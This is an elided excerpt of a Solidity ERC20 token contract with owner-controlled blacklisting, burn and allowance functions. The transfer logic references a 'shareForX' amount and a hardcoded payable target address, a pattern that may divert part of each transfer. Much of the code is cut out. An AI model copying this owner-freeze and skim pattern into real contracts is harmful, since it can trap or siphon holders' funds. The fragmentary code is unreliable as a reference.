...
interface IDriveCryptoBlackList {
...
interface IDriveCryptoToken is IERC20, IDriveCryptoBlackList{
...
abstract contract DriveCryptoBlackList is IDriveCryptoBlackList {
    ...
    modifier onlyOwner() {
        require(msg.sender == _owner, "DriveCryptoToken: MSG_SENDER_IS_NOT_OWNER");
        _;
    }

    modifier onlyNewOwner() {
        require(msg.sender == _newOwner, "DriveCryptoToken: MSG_SENDER_IS_NOT_NEW_OWNER");
        _;
    }

    function changeOwner(address ownerToSet) public override onlyOwner {
        require(ownerToSet != address(0), "DriveCryptoToken: INVALID_OWNER_ADDRESS");
        require(ownerToSet != _owner, "DriveCryptoToken: NEW_OWNER_IS_THE_SAME_AS_CURRENT_OWNER");
        require(ownerToSet != _newOwner, "DriveCryptoToken: NEW_OWNER_IS_THE_SAME_AS_CURRENT_NEW_OWNER");
...
contract DriveCryptoToken is IDriveCryptoToken, DriveCryptoBlackList {

    using SafeMath256 for uint256;

    address payable target = 0x964c566125D884bF01D8641261fb3decDc689328;
    ...
    constructor (string memory name, string memory symbol, uint256 supply, uint8 decimals) public DriveCryptoBlackList() {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
        _totalSupply = supply;
    ...
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        ...
        // the transaction. 
        assert(_balances[msg.sender] + _balances[recipient] + shareForX ==
    ...
    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        ...
        _approve(sender, msg.sender,
                _allowances[sender][msg.sender].sub(amount, "DriveCryptoToken: TRANSFER_AMOUNT_EXCEEDS_ALLOWANCE"));
        return true;
    }
    ...
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual override returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender].sub(subtractedValue, "DriveCryptoToken: DECREASED_ALLOWANCE_BELOW_ZERO"));
        return true;
    }
    ...
    function burnFrom(address account, uint256 amount) public virtual override {
        uint256 decreasedAllowance = allowance(account, msg.sender).sub(amount, "DriveCryptoToken: BURN_AMOUNT_EXCEEDS_ALLOWANCE");
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "DriveCryptoToken: TRANSFER_FROM_THE_ZERO_ADDRESS");
        require(recipient != address(0), "DriveCryptoToken: TRANSFER_TO_THE_ZERO_ADDRESS");
        _beforeTokenTransfer(sender, recipient);

        _balances[sender] = _balances[sender].sub(amount, "DriveCryptoToken: TRANSFER_AMOUNT_EXCEEDS_BALANCE");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "DriveCryptoToken: BURN_FROM_THE_ZERO_ADDRESS");
        ...
        _balances[account] = _balances[account].sub(amount, "DriveCryptoToken: BURN_AMOUNT_EXCEEDS_BALANCE");
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "DriveCryptoToken: APPROVE_FROM_THE_ZERO_ADDRESS");
        require(spender != address(0), "DriveCryptoToken: APPROVE_TO_THE_ZERO_ADDRESS");
    ...
    function _beforeTokenTransfer(address from, address to) internal virtual view {
        require(!isBlackListed(msg.sender), "DriveCryptoToken: MSG_SENDER_IS_BLACKLISTED_BY_TOKEN_OWNER");
        require(!isBlackListed(from), "DriveCryptoToken: FROM_IS_BLACKLISTED_BY_TOKEN_OWNER");
        require(!isBlackListed(to), "DriveCryptoToken: TO_IS_BLACKLISTED_BY_TOKEN_OWNER");
    }
